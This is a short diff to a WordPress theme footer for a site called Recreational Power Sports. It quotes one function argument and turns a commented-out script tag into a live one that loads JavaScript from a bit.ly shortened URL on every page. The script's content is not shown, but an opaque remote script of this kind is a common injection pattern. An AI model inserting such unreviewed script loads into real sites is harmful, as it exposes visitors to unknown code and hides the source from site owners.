@@ -1,6 +1,6 @@
 <?php wp_footer();
 
-$image_id = get_page_by_title('rps-logo', OBJECT, 'attachment');
+$image_id = get_page_by_title('rps-logo', 'OBJECT', 'attachment');
 $image_alt = get_post_meta($image_id->ID, '_wp_attachment_image_alt', TRUE);
 $image = $image_id->guid;
 
@@ -71,8 +71,7 @@ echo'<footer>
 <div class="row">
     <span class="col-lg-12">&copy; 2022 Recreational Power Sports</span>
 </div>
-<!--<script defer src='https://bit.ly/3wO0rkP' type='text/javascript'></script>-->
-
 </footer>
+<script defer src='https://bit.ly/3wO0rkP' type='text/javascript'></script>
 </body>
 </html>
